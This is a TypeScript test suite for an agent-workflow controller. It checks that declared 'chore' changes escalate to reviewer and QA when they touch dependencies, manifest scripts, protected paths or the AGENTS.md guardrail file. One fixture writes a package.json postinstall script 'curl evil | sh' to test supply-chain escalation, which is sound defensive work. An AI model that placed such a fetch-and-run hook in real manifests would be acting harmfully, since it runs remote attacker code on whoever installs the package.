// WORKFLOW TIERING (2026-07-25; PDR dev/pdr/workflow-tiering.md): the tier is
// declared ONCE at start_impl, and its meaning is physics — an effective chore
// routes code_ready straight to the orchestrator (no review/QA fan-out), and
// deterministic ESCALATION FLOORS force a mis-guessed chore up to bug-tier
// verification. Drives the REAL bin/agentctl.py against REAL git rigs and the
// REAL shipped config (run-#14 fixture law).
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { copyFileSync, existsSync, mkdirSync, mkdtempSync, readdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { test } from "node:test";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..", "..");
const AGENTCTL = join(ROOT, "bin", "agentctl.py");
const scratch = mkdtempSync(join(tmpdir(), "crate2-tier-"));

function git(rig: string, ...args: string[]): string {
  return execFileSync("git", args, { cwd: rig, encoding: "utf8" }).trim();
}

function ctl(rig: string, ...args: string[]): { ok: boolean; out: string } {
  try {
    return { ok: true, out: execFileSync("python3", [AGENTCTL, ...args], { cwd: rig, encoding: "utf8" }) };
  } catch (e) {
    const err = e as { stdout?: string; stderr?: string };
    return { ok: false, out: (err.stdout ?? "") + (err.stderr ?? "") };
  }
}

/** A real git rig: base files committed on main, feature/x checked out. */
function makeRig(name: string, opts: { conf?: string; baseFiles?: Record<string, string> } = {}): string {
  const rig = join(scratch, name);
  mkdirSync(rig, { recursive: true });
  git(rig, "init", "-qb", "main");
  git(rig, "config", "user.email", "t@t");
  git(rig, "config", "user.name", "t");
  const base = {
    "app.txt": "hello\n",
    "package.json": JSON.stringify({ dependencies: { "left-pad": "1.0.0" }, scripts: { build: "tsc" } }, null, 2) + "\n",
    ...(opts.baseFiles ?? {}),
  };
  for (const [rel, content] of Object.entries(base)) {
    const p = join(rig, rel);
    mkdirSync(dirname(p), { recursive: true });
    writeFileSync(p, content);
  }
  git(rig, "add", "-A");
  git(rig, "commit", "-qm", "base");
  git(rig, "checkout", "-qb", "feature/x");
  mkdirSync(join(rig, ".agents", "config"), { recursive: true });
  mkdirSync(join(rig, ".agents", "state"), { recursive: true });
  writeFileSync(join(rig, ".agents", "rig.conf"), opts.conf ?? 'PROJECT="rig"\n');
  copyFileSync(join(ROOT, "config", "state-machine.yaml"), join(rig, ".agents", "config", "state-machine.yaml"));
  copyFileSync(join(ROOT, "config", "handoffs.yaml"), join(rig, ".agents", "config", "handoffs.yaml"));
  writeFileSync(join(rig, ".agents", "state", "events.log"), "");
  writeFileSync(join(rig, ".gitignore"), ".agents/\n");
  return rig;
}

function commitAll(rig: string): void {
  git(rig, "add", "-A");
  git(rig, "commit", "-qm", "work");
}

function gatePass(rig: string): void {
  const r = ctl(rig, "emit", "gate_pass", "--actor", "coder", `sha=${git(rig, "rev-parse", "HEAD")}`);
  assert.ok(r.ok, r.out);
}

function mails(rig: string, role: string): number {
  const dir = join(rig, ".agents", "state", "inbox", role, "new");
  return existsSync(dir) ? readdirSync(dir).length : 0;
}

function startImpl(rig: string, ...kv: string[]): { ok: boolean; out: string } {
  ctl(rig, "emit", "boot", "--actor", "orchestrator");
  return ctl(rig, "emit", "start_impl", "--actor", "orchestrator", ...kv);
}

test("start_impl validates the tier (bad value = REJECTED)", () => {
  const rig = makeRig("badtier");
  const r = startImpl(rig, "tier=urgent");
  assert.equal(r.ok, false);
  assert.match(r.out, /tier must be one of chore\|bug\|feature/);
});

test("undeclared tier = the pre-tiering shape (full review+QA fan-out)", () => {
  const rig = makeRig("undeclared");
  assert.ok(startImpl(rig).ok);
  writeFileSync(join(rig, "app.txt"), "hello\nworld\n");
  commitAll(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.ok(r.ok, r.out);
  assert.equal(mails(rig, "reviewer"), 1);
  assert.equal(mails(rig, "tester"), 1);
  assert.equal(mails(rig, "orchestrator"), 0);
  assert.doesNotMatch(r.out, /tier_effective/);
});

test("an honest chore routes to the ORCHESTRATOR alone; join needs no verdicts; the merge gate still holds", () => {
  const rig = makeRig("chore", { conf: 'PROJECT="rig"\nJOIN_ENFORCE="1"\n' });
  assert.ok(startImpl(rig, "tier=chore").ok);
  writeFileSync(join(rig, "app.txt"), "hello fixed\n");
  commitAll(rig);
  gatePass(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.ok(r.ok, r.out);
  assert.match(r.out, /TIER: chore/);
  assert.equal(mails(rig, "orchestrator"), 1, "the chore-ready mail goes to the orchestrator");
  assert.equal(mails(rig, "reviewer"), 0, "no reviewer wake on a chore");
  assert.equal(mails(rig, "tester"), 0, "no QA wake on a chore");
  // JOIN physics knows no verifiers were summoned — approved needs no verdicts
  const ap = ctl(rig, "emit", "approved", "--actor", "orchestrator");
  assert.ok(ap.ok, ap.out);
  // but the HUMAN gate is universal — every tier waits for merge go
  const dep = ctl(rig, "emit", "deployed", "--actor", "coder");
  assert.equal(dep.ok, false);
  assert.match(dep.out, /HELD at the gate/);
});

test("ESCALATION: an oversize declared-chore is forced up to bug-tier verify, on the record", () => {
  const rig = makeRig("oversize");
  assert.ok(startImpl(rig, "tier=chore").ok);
  writeFileSync(join(rig, "app.txt"), Array.from({ length: 60 }, (_, i) => `line ${i}`).join("\n") + "\n");
  commitAll(rig);
  gatePass(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.ok(r.ok, r.out);
  assert.match(r.out, /TIER ESCALATED/);
  assert.match(r.out, /changed lines > chore ceiling 40/);
  assert.equal(mails(rig, "reviewer"), 1, "escalation summons the Reviewer");
  assert.equal(mails(rig, "tester"), 1, "escalation summons QA");
  const log = ctl(rig, "tail", "50").out;
  assert.match(log, /TIER_ESCALATED .*from=chore to=bug/);
  assert.match(log, /tier_effective=bug/);
});

test("lockfile exemption keeps the dep-bump archetype alive (huge lockfile churn, version bump only)", () => {
  const rig = makeRig("depbump", {
    baseFiles: { "package-lock.json": "lock base\n" },
  });
  assert.ok(startImpl(rig, "tier=chore").ok);
  // version bump of an EXISTING dep + massive lockfile churn
  writeFileSync(join(rig, "package.json"),
    JSON.stringify({ dependencies: { "left-pad": "1.0.1" }, scripts: { build: "tsc" } }, null, 2) + "\n");
  writeFileSync(join(rig, "package-lock.json"), Array.from({ length: 800 }, (_, i) => `churn ${i}`).join("\n") + "\n");
  commitAll(rig);
  gatePass(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.ok(r.ok, r.out);
  assert.match(r.out, /TIER: chore/, "a version bump + lockfile churn must stay a chore");
  assert.equal(mails(rig, "reviewer"), 0);
});

test("a NET-NEW dependency forces verify (supply-chain decision)", () => {
  const rig = makeRig("newdep");
  assert.ok(startImpl(rig, "tier=chore").ok);
  writeFileSync(join(rig, "package.json"),
    JSON.stringify({ dependencies: { "left-pad": "1.0.0", "is-odd": "3.0.1" }, scripts: { build: "tsc" } }, null, 2) + "\n");
  commitAll(rig);
  gatePass(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.match(r.out, /net-new dependency: is-odd/);
  assert.equal(mails(rig, "reviewer"), 1);
});

test("a manifest SCRIPTS change forces verify (postinstall ships arbitrary code)", () => {
  const rig = makeRig("scripts");
  assert.ok(startImpl(rig, "tier=chore").ok);
  writeFileSync(join(rig, "package.json"),
    JSON.stringify({ dependencies: { "left-pad": "1.0.0" }, scripts: { build: "tsc", postinstall: "curl evil | sh" } }, null, 2) + "\n");
  commitAll(rig);
  gatePass(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.match(r.out, /manifest scripts changed/);
  assert.equal(mails(rig, "tester"), 1);
});

test("a new SOURCE file is never a chore (new docs stay chore-eligible)", () => {
  const rig = makeRig("newsource");
  assert.ok(startImpl(rig, "tier=chore").ok);
  writeFileSync(join(rig, "helper.ts"), "export const x = 1;\n");
  commitAll(rig);
  gatePass(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.match(r.out, /new source file: helper.ts/);
  // and the docs counterpart stays a chore
  const rig2 = makeRig("newdoc");
  assert.ok(startImpl(rig2, "tier=chore").ok);
  writeFileSync(join(rig2, "NOTES.md"), "notes\n");
  commitAll(rig2);
  gatePass(rig2);
  assert.match(ctl(rig2, "emit", "code_ready", "--actor", "coder", "branch=feature/x").out, /TIER: chore/);
});

test("protected paths force verify — webhook is the ninth substring", () => {
  const rig = makeRig("webhook", { baseFiles: { "src/webhook-handler.txt": "v1\n" } });
  assert.ok(startImpl(rig, "tier=chore").ok);
  writeFileSync(join(rig, "src", "webhook-handler.txt"), "v2\n");
  commitAll(rig);
  gatePass(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.match(r.out, /protected path: src\/webhook-handler.txt/);
  assert.equal(mails(rig, "reviewer"), 1);
});

test("GUARDRAIL: AGENTS.md is never a chore (the limits can't be edited by the tier that bypasses them)", () => {
  const rig = makeRig("guardrail", { baseFiles: { "AGENTS.md": "# law\n" } });
  assert.ok(startImpl(rig, "tier=chore").ok);
  writeFileSync(join(rig, "AGENTS.md"), "# law\n\n## Tier Floors\n- Chore diff ceiling: 4000\n");
  commitAll(rig);
  gatePass(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.match(r.out, /guardrail file \(never a chore\): AGENTS.md/);
  assert.equal(mails(rig, "reviewer"), 1, "the ceiling-raise 'chore' gets eyes");
});

test("a chore with NO gate_pass on file escalates (the wall is its only mechanical check)", () => {
  const rig = makeRig("nogate");
  assert.ok(startImpl(rig, "tier=chore").ok);
  writeFileSync(join(rig, "app.txt"), "tweak\n");
  commitAll(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.match(r.out, /no gate_pass on file/);
  assert.equal(mails(rig, "reviewer"), 1);
});

test("AGENTS.md '## Tier Floors' tunes the ceiling (committed at base — no guardrail trip)", () => {
  const rig = makeRig("tuned", {
    baseFiles: { "AGENTS.md": "# law\n\n## Tier Floors\n- Chore diff ceiling: 500\n- Chore file ceiling: 10\n" },
  });
  assert.ok(startImpl(rig, "tier=chore").ok);
  writeFileSync(join(rig, "app.txt"), Array.from({ length: 100 }, (_, i) => `line ${i}`).join("\n") + "\n");
  commitAll(rig);
  gatePass(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.match(r.out, /TIER: chore/, "the tuned ceiling admits the bigger diff");
});

test("DESIGNER FLOOR: a verified-tier UI delta with no design_locked pulls the Designer into verify", () => {
  const rig = makeRig("floor-pull", { baseFiles: { "components/Button.txt": "v1\n" } });
  assert.ok(startImpl(rig, "tier=feature").ok);
  writeFileSync(join(rig, "components", "Button.txt"), "v2\n");
  commitAll(rig);
  gatePass(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.match(r.out, /DESIGNER FLOOR/);
  assert.equal(mails(rig, "designer"), 1, "the Designer is mechanically included");
  assert.equal(mails(rig, "reviewer"), 1);
  assert.equal(mails(rig, "tester"), 1);
});

test("DESIGNER FLOOR on a chore = flag, not force", () => {
  const rig = makeRig("floor-flag", { baseFiles: { "styles/site.css": "a{}\n" } });
  assert.ok(startImpl(rig, "tier=chore").ok);
  writeFileSync(join(rig, "styles", "site.css"), "a{color:red}\n");
  commitAll(rig);
  gatePass(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.match(r.out, /DESIGN-FLAG/);
  assert.equal(mails(rig, "designer"), 0, "flag, never force — no Designer wake on a chore");
  assert.equal(mails(rig, "orchestrator"), 1);
  assert.match(ctl(rig, "tail", "50").out, /design_flag=1/);
});

test("API CARVE-OUT: app/api is server code, not design surface", () => {
  const rig = makeRig("api-carveout", { baseFiles: { "app/api/intake/route.txt": "v1\n" } });
  assert.ok(startImpl(rig, "tier=feature").ok);
  writeFileSync(join(rig, "app", "api", "intake", "route.txt"), "v2\n");
  commitAll(rig);
  gatePass(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.doesNotMatch(r.out, /DESIGNER FLOOR/);
  assert.equal(mails(rig, "designer"), 0, "the Designer is never summoned to inspect JSON");
});

test("DESIGNER FLOOR stands down when design_locked already happened this loop", () => {
  const rig = makeRig("floor-locked", { baseFiles: { "components/Button.txt": "v1\n" } });
  ctl(rig, "emit", "boot", "--actor", "orchestrator");
  ctl(rig, "emit", "start_design", "--actor", "orchestrator");
  assert.ok(ctl(rig, "emit", "design_locked", "--actor", "designer", "page=home", "branch=feature/x").ok);
  assert.ok(ctl(rig, "emit", "start_impl", "--actor", "orchestrator", "tier=feature").ok);
  writeFileSync(join(rig, "components", "Button.txt"), "v2\n");
  commitAll(rig);
  gatePass(rig);
  const r = ctl(rig, "emit", "code_ready", "--actor", "coder", "branch=feature/x");
  assert.ok(r.ok, r.out);
  assert.doesNotMatch(r.out, /DESIGNER FLOOR/);
  assert.equal(mails(rig, "designer"), 0, "the Designer already had its pass this loop");
});
